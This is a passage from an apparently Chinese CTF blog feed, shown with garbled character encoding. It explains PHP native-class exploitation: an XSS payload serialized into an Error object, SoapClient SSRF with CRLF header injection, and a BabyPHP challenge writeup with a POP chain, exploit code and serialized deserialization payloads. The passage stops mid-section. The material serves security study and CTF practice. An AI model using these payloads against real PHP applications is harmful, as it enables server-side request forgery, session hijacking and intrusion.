//O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A39%3A%22D%3A%5CphpStudy%5CPHPTutorial%5CWWW%5Chtml%5Cqq.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D</span><br><span class="line">Â ?&gt;</span><br></pre></td></tr></table></figure><p>echoçš„æ—¶å€™ï¼Œç›´æ¥è§¦å‘Errorç±»é‡Œé¢çš„_tostring,ç›´æ¥æ‰§è¡Œjsä»£ç å®ç°xssã€‚</p><h5 id="SSRF-By-SoapClient"><a href="#SSRF-By-SoapClient" class="headerlink" title="SSRF By SoapClient"></a>SSRF By SoapClient</h5><p>PHP çš„å†…ç½®ç±» SoapClient æ˜¯ä¸€ä¸ªä¸“é—¨ç”¨æ¥<strong>è®¿é—®webæœåŠ¡</strong>çš„ç±»ï¼Œå¯ä»¥æä¾›ä¸€ä¸ªåŸºäºSOAPåè®®è®¿é—®WebæœåŠ¡çš„ PHP å®¢æˆ·ç«¯ã€‚</p><p>ç±»æ‘˜è¦ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Â SoapClient &#123;</span><br><span class="line">Â  Â  Â /* æ–¹æ³• */</span><br><span class="line">Â  Â  Â public __construct ( stringnull $wsdl , array $options = [] )</span><br><span class="line">Â  Â  Â public __call ( string $name , array $args ) : mixed</span><br><span class="line">Â  Â  Â public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay = false ) : stringnull</span><br><span class="line">Â  Â  Â public __getCookies ( ) : array</span><br><span class="line">Â  Â  Â public __getFunctions ( ) : arraynull</span><br><span class="line">Â  Â  Â public __getLastRequest ( ) : stringnull</span><br><span class="line">Â  Â  Â public __getLastRequestHeaders ( ) : stringnull</span><br><span class="line">Â  Â  Â public __getLastResponse ( ) : stringnull</span><br><span class="line">Â  Â  Â public __getLastResponseHeaders ( ) : stringnull</span><br><span class="line">Â  Â  Â public __getTypes ( ) : arraynull</span><br><span class="line">Â  Â  Â public __setCookie ( string $name , stringnull $value = null ) : void</span><br><span class="line">Â  Â  Â public __setLocation ( string $location = &quot;&quot; ) : stringnull</span><br><span class="line">Â  Â  Â public __setSoapHeaders ( SoapHeaderarraynull $headers = null ) : bool</span><br><span class="line">Â  Â  Â public __soapCall ( string $name , array $args , arraynull $options = null , SoapHeaderarraynull $inputHeaders = null , array &amp;$outputHeaders = null ) : mixed</span><br><span class="line">Â &#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ª__call æ–¹æ³•ï¼Œå½“__call æ–¹æ³•è¢«è§¦å‘åï¼Œå®ƒå¯ä»¥<strong>å‘é€ HTTP å’Œ HTTPS è¯·æ±‚</strong>ã€‚æ­£æ˜¯è¿™ä¸ª <code>__call</code> æ–¹æ³•ï¼Œä½¿å¾— SoapClient ç±»å¯ä»¥è¢«æˆ‘ä»¬è¿ç”¨åœ¨ SSRF ä¸­ã€‚SoapClient è¿™ä¸ªç±»ä¹Ÿç®—æ˜¯ç›®å‰è¢«æŒ–æ˜å‡ºæ¥æœ€å¥½ç”¨çš„ä¸€ä¸ªå†…ç½®ç±»ã€‚</p><blockquote><p>SoapClienté‡‡ç”¨äº†HTTPä½œä¸ºåº•å±‚é€šè®¯åè®®ï¼ŒXMLä½œä¸ºæ•°æ®ä¼ é€çš„æ ¼å¼ï¼Œå…¶é‡‡ç”¨äº†SOAPåè®®(SOAP æ˜¯ä¸€ç§ç®€å•çš„åŸºäº XML çš„åè®®,å®ƒä½¿åº”ç”¨ç¨‹åºé€šè¿‡ HTTP æ¥äº¤æ¢ä¿¡æ¯)ï¼Œå…¶æ¬¡æˆ‘ä»¬çŸ¥é“æŸä¸ªå®ä¾‹åŒ–çš„ç±»ï¼Œå¦‚æœå»è°ƒç”¨äº†ä¸€ä¸ªä¸å­˜åœ¨çš„å‡½æ•°ï¼Œä¼šå»è°ƒç”¨ __call æ–¹æ³•ã€‚</p></blockquote><p>åˆ©ç”¨è¿™ä¸€ç‚¹æ„é€ pocï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Â &lt;?php</span><br><span class="line">Â $a = new SoapClient(null,array(&#x27;location&#x27;=&gt;&#x27;http://47.xxx.xxx.72:2333/aaa&#x27;, &#x27;uri&#x27;=&gt;&#x27;http://47.xxx.xxx.72:2333&#x27;));</span><br><span class="line">Â $b = serialize($a);</span><br><span class="line">Â echo $b;</span><br><span class="line">Â $c = unserialize($b);</span><br><span class="line">Â $c-&gt;a(); Â  Â // éšä¾¿è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•, è§¦å‘__callæ–¹æ³•è¿›è¡Œssrf</span><br><span class="line">Â ?&gt;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ï¼Œç”±äºå®ƒä»…é™äºHTTP&#x2F;HTTPSåè®®ï¼Œæ‰€ä»¥ç”¨å¤„ä¸æ˜¯å¾ˆå¤§ã€‚è€Œå¦‚æœè¿™é‡ŒHTTPå¤´éƒ¨è¿˜å­˜åœ¨CRLFæ¼æ´çš„è¯ï¼Œä½†æˆ‘ä»¬åˆ™å¯ä»¥é€šè¿‡SSRF+CRLFï¼Œæ’å…¥ä»»æ„çš„HTTPå¤´ã€‚</p><p>å¦‚ä½•ssrfå’Œcrlfç»„åˆæ‹³ï¼Ÿ</p><blockquote><p>ssrfåˆ©ç”¨SoapClientå»å‘å‡ºhttpè¯·æ±‚å¹¶é€šè¿‡ <code>SoapClient</code> æ¥è®¾ç½® <code>User-Agent</code> ï¼Œå°†åŸæ¥çš„ <code>Content-Type</code> æŒ¤ä¸‹å»ï¼Œä»è€Œå†æ’å…¥ä¸€ä¸ªæ–°çš„ <code>Content-Type</code> æˆ–è€…å…¶ä»–çš„è¯·æ±‚å¤´æ•°æ®ã€‚ã€content-typeæ˜¯å› ä¸ºæˆ‘ä»¬è¦ä¸Šä¼ postæ•°æ®ï¼Œéœ€è¦æŠŠcontent-tyoeæ”¹ä¸ºapplication&#x2F;x-www-form-urlencodedã€‚ã€‘</p></blockquote><p>æŸCTFé¢˜ç›®å¤ç°ï¼š</p><p><a href="https://www.anquanke.com/post/id/238482#h3-12">https://www.anquanke.com/post/id/238482#h3-12</a> [è¯¦ç»†]</p><p><a href="http://psych.green/psych/web/ctf/%e7%ac%ac%e4%ba%94%e5%b1%8a%e5%ae%89%e6%b4%b5%e6%9d%af-2022-web-writeup.html#BabyPHP">http://psych.green/psych/web/ctf/%e7%ac%ac%e4%ba%94%e5%b1%8a%e5%ae%89%e6%b4%b5%e6%9d%af-2022-web-writeup.html#BabyPHP</a> [å®‰æ´µæ¯BabyPHPï¼Œä¸ªäººåšå®¢]</p><p><a href="https://www.cnblogs.com/20175211lyz/p/11515519.html">https://www.cnblogs.com/20175211lyz/p/11515519.html</a> [LCTF]</p><p>[LCTF]æ•´ä½“æ€è·¯ï¼š</p><ul><li>é¢˜ç›®è¦æ±‚å½“REMOTE_ADDRç­‰äº127.0.0.1æ—¶ï¼Œå°±ä¼šåœ¨sessionä¸­æ’å…¥flagï¼Œå°±èƒ½å¾—åˆ°flagã€‚æ‰€ä»¥æˆ‘ä»¬æƒ³åŠæ³•åˆ©ç”¨ssrfå»ä¿®æ”¹è¯·æ±‚ï¼Œè®©REMOTE_ADDRç­‰äº127.0.0.1Â &lt;?php<br>Â $target &#x3D; â€œ<a href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a>â€œ;<br>Â $attack &#x3D; new SoapClient(null,array(â€˜locationâ€™ &#x3D;&gt; $target,<br>Â  Â  Â â€˜user_agentâ€™ &#x3D;&gt; â€œN0rth3ty\r\nCookie: PHPSESSID&#x3D;tcjr6nadpk3md7jbgioa6elfk4\r\nâ€,<br>Â  Â  Â â€˜uriâ€™ &#x3D;&gt; â€œ123â€));<br>Â $payload &#x3D; urlencode(serialize($attack));<br>Â echo $payload;</li><li>è¿™é‡Œè¿™ä¸ªPOCå°±æ˜¯åˆ©ç”¨CRLFä¼ªé€ æœ¬åœ°è¯·æ±‚SSRFå»è®¿é—®flag.phpï¼Œå¹¶å°†å¾—åˆ°çš„flagç»“æœä¿å­˜åœ¨cookieä¸º <code>PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4</code> çš„sessionä¸­ã€‚</li><li>ç°åœ¨flagè¢«æˆ‘ä»¬å­˜å‚¨åœ¨äº†cookieä¸º <code>PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4</code> çš„sessionä¸­ï¼Œæˆ‘ä»¬è¦æƒ³åŠæ³•è¿›å…¥è¿™ä¸ªsession</li><li>è¦æƒ³åŠæ³•åºåˆ—åŒ–è¿™ä¸ªå¯¹è±¡ï¼Œä½†æ˜¯æºä»£ç å¹¶æ²¡æœ‰å¯ä»¥ç›´æ¥åˆ©ç”¨çš„å¯ä»¥åºåˆ—åŒ–çš„åœ°æ–¹ï¼Œåˆåœ¨é¢˜ç›®é‡Œé¢æ‰¾åˆ°äº†ä¸€ä¸ªsession_start()å‡½æ•°ï¼Œæˆ‘ä»¬å°±æƒ³åŠæ³•é€šè¿‡sessionååºåˆ—åŒ–æ¥åš</li><li>é¢˜ç›®ä¸­æ¯”è¾ƒå…³é”®çš„å‡½æ•°å°±æ˜¯<code>call_user_fun($b,$a)</code>ï¼Œæˆ‘ä»¬çŸ¥é“<code>call_user_func()</code>æ˜¯æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå‡½æ•°ç¬¬äºŒä¸ªå‚æ•°ä½œä¸ºå‡½æ•°ä¼ å…¥çš„å€¼ã€‚æˆ–è€…æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºç±»åï¼Œç¬¬äºŒä¸ªå‚æ•°ä½œä¸ºæ–¹æ³•åã€‚</li><li>æˆ‘ä»¬æ„é€ <code>call_user_fun(seesioon_start,serialize_handler=php_serialize)</code>ç„¶åé€šè¿‡sessionååºåˆ—åŒ–ï¼Œæˆ‘ä»¬æˆåŠŸå°†æˆ‘ä»¬phpåŸç”Ÿç±»SoapClientæ„é€ çš„payloadä¼ å…¥äº† <code>PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4</code> çš„sessionä¸­ï¼Œå½“é¡µé¢é‡æ–°åŠ è½½æ—¶ï¼Œå°±ä¼šè‡ªåŠ¨å°†å…¶ååºåˆ—åŒ–</li><li>ç°åœ¨æˆ‘ä»¬éœ€è¦è§¦å‘SoapClienté‡Œé¢çš„<code>__call</code>æ¥é€ æˆssrfï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è®¿é—®ä¸€ä¸ªSoapClienté‡Œé¢çš„ä¸å­˜åœ¨çš„æ–¹æ³•å</li><li>æŠŠ<code>call_user_fun($b,$a)</code>ã€å…¶ä¸­$a &#x3D; array(reset($_SESSION), â€˜welcome_to_the_lctf2018â€™);ã€‘æ„é€ æˆ`call_user_func(call_user_func, array(reset($_SESSION), â€˜welcome_to_the_lctf2018â€™));`æˆåŠŸè§¦å‘callæ–¹æ³•ã€‚</li><li>æœ€åï¼Œæˆ‘ä»¬ç¬¬ä¸‰æ¬¡ä¼ å‚ï¼Œç”¨æˆ‘ä»¬POCé‡Œé¢è‡ªå·±è®¾ç½®çš„cookieï¼ˆ<code>PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4</code>ï¼‰å»è®¿é—®è¿™ä¸ªé¡µé¢ï¼Œ<code>var_dump($_SESSION);</code> ä¼šå°† <code>PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4</code> çš„è¿™ä¸ªsessionå†…å®¹è¾“å‡ºå‡ºæ¥ï¼Œå³å¯å¾—åˆ°flag</li></ul>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> webåŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> webåŸºç¡€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬äº”å±Šå®‰æ´µæ¯-2022-web-writeup</title>
      <link href="/2023/07/06/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF-2022-web-writeup/"/>
      <url>/2023/07/06/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF-2022-web-writeup/</url>
      
        <content type="html"><![CDATA[<p>é¢˜ç›®ï¼š</p><ul><li>Babyphp(2022å®‰æ´µæ¯)</li><li>Babyweb(2023å®‰æ´µæ¯æ˜¥å­£èµ›)</li></ul><hr><h2 id="Babyphp-2022å®‰æ´µæ¯"><a href="#Babyphp-2022å®‰æ´µæ¯" class="headerlink" title="Babyphp(2022å®‰æ´µæ¯)"></a>Babyphp(2022å®‰æ´µæ¯)</h2><p>å®˜æ–¹wpï¼š<a href="https://bbs.kanxue.com/thread-275369.htm">https://bbs.kanxue.com/thread-275369.htm</a></p><h2 id="BabyPHP"><a href="#BabyPHP" class="headerlink" title="BabyPHP"></a>BabyPHP</h2><p>çŸ¥è¯†ç‚¹ï¼šsessionååºåˆ—åŒ–ï¼ˆpopé“¾ï¼‰-&gt;soap(ssrf+crlf)-&gt;call_user_funcæ¿€æ´»soapç±»</p><p><a href="https://www.cnblogs.com/20175211lyz/p/11515519.html">å‚è€ƒåšå®¢1</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg2NDgyNTAzMw==&mid=2247484241&idx=1&sn=76c9bba70fd81bffa4f4d6919d7b98cd&chksm=ce6238f7f915b1e15b477d625f08c318de6c0532079d8c22a135e410b964c9dc3234f13db680&mpshare=1&scene=23&srcid=1128PSR0BFXYuDzkmnCay6z3&sharer_sharetime=1669595430468&sharer_shareid=93d3023652ea1e4f581f6748f20cfe90#rd">å‚è€ƒåšå®¢2</a></p><p>é¢˜ç›®æºç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">///index.php</span><br><span class="line">&lt;?php</span><br><span class="line">//somethingÂ inÂ flag.php</span><br><span class="line"></span><br><span class="line">classÂ A</span><br><span class="line">&#123;</span><br><span class="line">Â Â Â Â publicÂ $a;</span><br><span class="line">Â Â Â Â publicÂ $b;</span><br><span class="line"></span><br><span class="line">Â Â Â Â publicÂ functionÂ __wakeup()</span><br><span class="line">Â Â Â Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â $this-&gt;aÂ =Â &quot;babyhacker&quot;;</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line"></span><br><span class="line">Â Â Â Â publicÂ functionÂ __invoke()</span><br><span class="line">Â Â Â Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â ifÂ (isset($this-&gt;a)Â &amp;&amp;Â $this-&gt;aÂ ==Â md5($this-&gt;a))Â &#123;         //md5ï¼Œ0eç»•è¿‡</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â $this-&gt;b-&gt;uwant();                                      // bæ˜¯class C</span><br><span class="line">Â Â Â Â Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">classÂ B</span><br><span class="line">&#123;</span><br><span class="line">Â Â Â Â publicÂ $a;</span><br><span class="line">Â Â Â Â publicÂ $b;</span><br><span class="line">Â Â Â Â publicÂ $k;</span><br><span class="line"></span><br><span class="line">Â Â Â Â functionÂ __destruct()</span><br><span class="line">Â Â Â Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â $this-&gt;bÂ =Â $this-&gt;k;</span><br><span class="line">Â Â Â Â Â Â Â Â die($this-&gt;a);                    //è·³åˆ°tostring()æ‰€ä»¥$this-&gt;a=class C</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">classÂ C</span><br><span class="line">&#123;</span><br><span class="line">Â Â Â Â publicÂ $a;</span><br><span class="line">Â Â Â Â publicÂ $c;</span><br><span class="line"></span><br><span class="line">Â Â Â Â publicÂ functionÂ __toString()</span><br><span class="line">Â Â Â Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â $ccÂ =Â $this-&gt;c;</span><br><span class="line">Â Â Â Â Â Â Â Â returnÂ $cc();                  //è°ƒç”¨å‡½æ•°ï¼Œé¢„è®¡è·³åˆ°Aé‡Œé¢çš„invoke</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â publicÂ functionÂ uwant()</span><br><span class="line">Â Â Â Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â ifÂ ($this-&gt;aÂ ==Â &quot;phpinfo&quot;)Â &#123;          //a=phpinfoå¯ä»¥ç›´æ¥çœ‹PHPinfo</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â phpinfo();</span><br><span class="line">Â Â Â Â Â Â Â Â &#125;Â elseÂ &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â call_user_func(array(reset($_SESSION),Â $this-&gt;a));        //æˆ–è€…é‡å†™a</span><br><span class="line">Â Â Â Â Â Â Â Â &#125; </span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ifÂ (isset($_GET[&#x27;d0g3&#x27;]))Â &#123;             </span><br><span class="line">Â Â Â Â ini_set($_GET[&#x27;baby&#x27;],Â $_GET[&#x27;d0g3&#x27;]);  //ini_set(&#x27;session.serialize_handler&#x27;, &#x27;è®¾ç½®çš„å¼•æ“&#x27;);</span><br><span class="line">Â Â Â Â session_start();</span><br><span class="line">Â Â Â Â $_SESSION[&#x27;sess&#x27;]Â =Â $_POST[&#x27;sess&#x27;];</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">Â Â Â Â session_start();</span><br><span class="line">Â Â Â Â ifÂ (isset($_POST[&quot;pop&quot;]))Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â unserialize($_POST[&quot;pop&quot;]);</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">highlight_file(__FILE__);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">///flag.php</span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">//flagåœ¨æ ¹ç›®å½•ä¸‹</span><br><span class="line">if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;)&#123;          //ssrf</span><br><span class="line">Â Â Â Â $f1ag=implode(array(newÂ $_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;])));</span><br><span class="line">Â Â Â Â $_SESSION[&quot;F1AG&quot;]=Â $f1ag;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">Â Â Â echoÂ &quot;onlyÂ localhost!!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="popé“¾"><a href="#popé“¾" class="headerlink" title="popé“¾"></a>popé“¾</h3><p>é“¾å­è§¦å‘æ˜¯é€šè¿‡<code>unserialize($_POST[&quot;pop&quot;]);</code>ï¼›ååºåˆ—åŒ–postçš„popã€‚</p><p>é“¾å­å…¥å£æ˜¯class bé‡Œé¢çš„ <code>__destruct()</code>;</p><p>é“¾å­çš„è·³æ¿å°±æ˜¯class a é‡Œé¢çš„ <code>__invoke()</code>;</p><p>é“¾å­çš„å‡ºå£åº”è¯¥æ˜¯class cé‡Œé¢çš„<code>__uwant</code> <code>call_user_func(array(reset($_SESSION), $this-&gt;a));</code></p><blockquote><p><code>call_user_func</code>:æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°è°ƒç”¨,æ•°ç»„ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ ä¸ºç±»åï¼Œç¬¬äºŒä¸ªå…ƒç´ ä¸ºç±»æ–¹æ³•ã€‚ã€ç¬¬ä¸€ä¸ªå‚æ•° <code>callback</code> æ˜¯è¢«è°ƒç”¨çš„å›è°ƒå‡½æ•°ï¼Œå…¶ä½™å‚æ•°æ˜¯å›è°ƒå‡½æ•°çš„å‚æ•°ã€‚ <strong>å‰è€…å‡½æ•°åè€…å‚æ•°</strong>ã€‘ï¼Œsessionè¿™ä¸ªå‡½æ•°å°±å¾ˆå¯ç–‘äº†</p><p><code>reset</code>:è¾“å‡ºæ•°ç»„ä¸­çš„å½“å‰å…ƒç´ å’Œä¸‹ä¸€ä¸ªå…ƒç´ çš„å€¼ï¼Œç„¶åæŠŠæ•°ç»„çš„å†…éƒ¨æŒ‡é’ˆé‡ç½®åˆ°æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ </p><p>ä¹Ÿå°±æ˜¯è¯´:reset() å‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</p></blockquote><h4 id="popé“¾-1"><a href="#popé“¾-1" class="headerlink" title="popé“¾"></a>popé“¾</h4><p>é“¾å­ B-&gt;a&#x3D;class C -&gt; C-&gt;c&#x3D;class A -&gt; A -&gt;a&#x3D;0eÂ·Â·Â· ; A-&gt;b&#x3D;class C</p><p><strong>class B __destruct -&gt; class C __tostring()-&gt;class A __invoke -&gt;class C __uwant</strong></p><h4 id="æ„é€ exp"><a href="#æ„é€ exp" class="headerlink" title="æ„é€ exp"></a>æ„é€ exp</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">class A</span><br><span class="line">&#123;</span><br><span class="line">    public $a = &#x27;0e215962017&#x27;;</span><br><span class="line">    public $b;</span><br><span class="line">    Â Â Â publicÂ functionÂ __invoke()</span><br><span class="line">Â Â Â Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â ifÂ (isset($this-&gt;a)Â &amp;&amp;Â $this-&gt;aÂ ==Â md5($this-&gt;a))Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â $this-&gt;b-&gt;uwant();</span><br><span class="line">Â Â Â Â Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">&#125;</span><br><span class="line">class B</span><br><span class="line">&#123;</span><br><span class="line">   Â publicÂ $a;</span><br><span class="line">Â Â Â Â publicÂ $b;</span><br><span class="line">Â Â Â Â publicÂ $k;</span><br><span class="line"></span><br><span class="line">Â Â Â Â functionÂ __destruct()</span><br><span class="line">Â Â Â Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â $this-&gt;bÂ =Â $this-&gt;k;</span><br><span class="line">Â Â Â Â Â Â Â Â die($this-&gt;a);</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">&#125;</span><br><span class="line">class C </span><br><span class="line">&#123;</span><br><span class="line">    Â Â publicÂ $aÂ ;</span><br><span class="line">Â Â Â Â   publicÂ $c;</span><br><span class="line"></span><br><span class="line">Â Â Â Â publicÂ functionÂ __toString()</span><br><span class="line">Â Â Â Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â $ccÂ =Â $this-&gt;c;</span><br><span class="line">Â Â Â Â Â Â Â Â returnÂ $cc();</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â publicÂ functionÂ uwant()</span><br><span class="line">Â Â Â Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â ifÂ ($this-&gt;aÂ ==Â &quot;phpinfo&quot;)Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â phpinfo();</span><br><span class="line">Â Â Â Â Â Â Â Â &#125;Â elseÂ &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â call_user_func(array(reset($_SESSION),Â $this-&gt;a));</span><br><span class="line">Â Â Â Â Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new A();</span><br><span class="line">$b = new B();</span><br><span class="line">$c = new C();</span><br><span class="line">$b -&gt; a = $c;</span><br><span class="line">$b -&gt;a -&gt; c = $a</span><br><span class="line">$a -&gt; b = $c;</span><br><span class="line">$c -&gt; a = &#x27;phpinfo&#x27;;</span><br><span class="line">echo (serialize($b));</span><br></pre></td></tr></table></figure><p>å¾—åˆ°payload</p><p><code>O:1:&quot;B&quot;:3:&#123;s:1:&quot;a&quot;;O:1:&quot;C&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;c&quot;;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;s:11:&quot;0e215962017&quot;;s:1:&quot;b&quot;;O:1:&quot;C&quot;:2:&#123;s:1:&quot;a&quot;;s:7:&quot;phpinfo&quot;;s:1:&quot;c&quot;;N;&#125;&#125;&#125;s:1:&quot;b&quot;;N;s:1:&quot;k&quot;;N;&#125;</code></p><p>æ”¹ä¸€ä¸‹å‚æ•°ç»•è¿‡wakeup</p><p><code>O:1:&quot;B&quot;:3:&#123;s:1:&quot;a&quot;;O:1:&quot;C&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;c&quot;;O:1:&quot;A&quot;:3:&#123;s:1:&quot;a&quot;;s:11:&quot;0e215962017&quot;;s:1:&quot;b&quot;;O:1:&quot;C&quot;:2:&#123;s:1:&quot;a&quot;;s:7:&quot;phpinfo&quot;;s:1:&quot;c&quot;;N;&#125;&#125;&#125;s:1:&quot;b&quot;;N;s:1:&quot;k&quot;;N;&#125;</code></p><h3 id="sessionååºåˆ—åŒ–"><a href="#sessionååºåˆ—åŒ–" class="headerlink" title="sessionååºåˆ—åŒ–"></a>sessionååºåˆ—åŒ–</h3><p>æ€è·¯ï¼š 